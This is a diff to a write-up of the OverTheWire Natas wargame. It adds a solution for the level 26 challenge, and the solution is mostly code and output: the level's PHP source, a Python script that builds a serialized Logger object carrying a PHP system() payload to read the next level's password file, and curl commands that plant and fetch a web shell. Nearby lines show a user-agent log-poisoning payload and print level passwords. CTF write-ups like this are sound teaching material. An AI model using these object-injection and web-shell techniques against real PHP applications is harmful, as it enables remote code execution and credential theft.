@@ -1854,8 +1854,6 @@ Now, because I cant read the natas_webpass, I need to dump it's content to my lo
 
 Notice that in the logFile function, it will write the user-agent head, as is, to the logs file. If it was a php code, when it dumps it, it would've been exeuted!
 
-
-
 ```
 abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//index.php?lang=....//logs/natas25_art-vandelay.log" -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws -s -H "Cookie: PHPSESSID=art-vandelay" -A '<?php system("cat /etc/natas_webpass/natas26"); ?>'
 ...
@@ -1865,6 +1863,197 @@ abs@MacBookPro OverTheWire % curl "http://natas25.natas.labs.overthewire.org//in
 ```
 
 # Level 25 -> 26:
+```
+abs@MacBookPro OverTheWire % curl "http://natas26.natas.labs.overthewire.org//index.php" -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE -s -i                                
+...
+Set-Cookie: PHPSESSID=8fijbetsllcoqc2govb9uhrlkr; path=/; HttpOnly
+...
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<body>
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+```
+
+We have two cookies:
+- The PHPSESSID - used for the img name/path: "img/natas26_$PHPSESSID.png"
+- The drawing - encoding of the drawing from the saved session
+
+
+I'll do object injection of Logger. I'll create Logger, with custom handlers, and create a drawing cookie out of it.
+
+When the php code will end, the destrcut function will be called and write the password of the next level to a new file i'll set:
+
+Let's write a python script that will give us the drawing cookie value:
+```
+import phpserialize, base64
+
+logger_obj = phpserialize.phpobject(b'Logger', {
+    b"logFile": "/var/www/natas/natas26/img/natas26_vandelay.php",
+    b"initMsg": "",
+    b"exitMsg": "<?php system(\"cat /etc/natas_webpass/natas27\"); ?>"
+})
+
+drawing_array = {0: logger_obj}
+
+payload = base64.b64encode(phpserialize.dumps(drawing_array)).decode()
+print(payload)
+```
+
+Run the python script:
+```
+abs@MacBookPro natas % python3 natas26.py
+YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6NzoibG9nRmlsZSI7czo0NzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl92YW5kZWxheS5waHAiO3M6NzoiaW5pdE1zZyI7czowOiIiO3M6NzoiZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjYiKTsgPz4iO319
+```
+
+
+```
+abs@MacBookPro OverTheWire % curl "http://natas26.natas.labs.overthewire.org/index.php?x1=10&y1=20&x2=30&y2=40" -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE -s -b "PHPSESSID=vandelay; drawing=YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6NzoibG9nRmlsZSI7czo0NzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl92YW5kZWxheS5waHAiO3M6NzoiaW5pdE1zZyI7czowOiIiO3M6NzoiZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTsgPz4iO319"
+...
+<h1>natas26</h1>
+...
+<img src="img/natas26_vandelay.png">
+```
+
+Now the "img/natas26_vandelay.php" file is created, with the password hopefuly:
+```
+abs@MacBookPro OverTheWire % curl "http://natas26.natas.labs.overthewire.org/img/natas26_vandelay.php" -u natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE -s
+u3RRffXjysjgwFU6b9xa23i6prmUsYne
+```
+
 # Level 26 -> 27:
 # Level 27 -> 28:
 # Level 28 -> 29:
